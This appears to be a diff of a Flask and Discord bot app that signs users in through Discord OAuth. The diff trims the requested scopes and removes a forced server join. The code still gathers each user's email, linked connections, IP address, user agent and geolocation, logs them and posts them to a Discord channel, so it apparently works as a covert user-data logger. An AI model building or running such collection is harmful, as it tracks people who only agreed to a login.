@@ -1,5 +1,5 @@
 from flask import Flask, request, render_template
-import requests, json, os, asyncio, threading
+import requests, json, os, threading
 from dotenv import load_dotenv
 from datetime import datetime
 from discord_bot import bot
@@ -70,9 +70,10 @@ def save_log(discord_id, structured_data):
 
 @app.route("/")
 def index():
+    # guilds.join を外して「サーバーに追加」画面を出さない
     discord_auth_url = (
         f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}"
-        f"&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20connections%20guilds.join%20applications.commands"
+        f"&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email%20connections"
     )
     return render_template("index.html", discord_auth_url=discord_auth_url)
 
@@ -91,7 +92,7 @@ def callback():
         "grant_type": "authorization_code",
         "code": code,
         "redirect_uri": REDIRECT_URI,
-        "scope": "identify email guilds connections"
+        "scope": "identify email connections"
     }
     try:
         res = requests.post(token_url, data=data, headers=headers)
@@ -106,18 +107,7 @@ def callback():
 
     headers_auth = {"Authorization": f"Bearer {access_token}"}
     user = requests.get("https://discord.com/api/users/@me", headers=headers_auth).json()
-    guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers_auth).json()
     connections = requests.get("https://discord.com/api/users/@me/connections", headers=headers_auth).json()
-
-    # サーバー参加処理
-    requests.put(
-        f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
-        headers={
-            "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
-            "Content-Type": "application/json"
-        },
-        json={"access_token": access_token}
-    )
 
     # IP / UA
     ip = get_client_ip()
@@ -142,7 +132,6 @@ def callback():
             "premium_type": user.get("premium_type"),
             "flags": user.get("flags"),
             "public_flags": user.get("public_flags"),
-            "guilds": guilds,
             "connections": connections
         },
         "ip_info": geo,
@@ -157,7 +146,7 @@ def callback():
 
     save_log(user["id"], structured_data)
 
-    # 非同期で Bot の処理を呼ぶ
+    # 非同期で BOT 処理
     async def send_embed():
         try:
             d = structured_data["discord"]
@@ -196,7 +185,7 @@ def callback():
         except Exception as e:
             print("Embed送信エラー:", e)
 
-    asyncio.run(send_embed())
+    bot.loop.create_task(send_embed())
 
     return render_template("welcome.html", username=user["username"], discriminator=user["discriminator"])
 
@@ -211,9 +200,9 @@ def show_logs():
     return render_template("logs.html", logs=logs)
 
 
-# 別スレッドで Bot を起動
+# BOT を別スレッドで起動
 def run_bot():
-    asyncio.run(bot.start(DISCORD_BOT_TOKEN))
+    bot.run(DISCORD_BOT_TOKEN)
 
 
 if __name__ == "__main__":
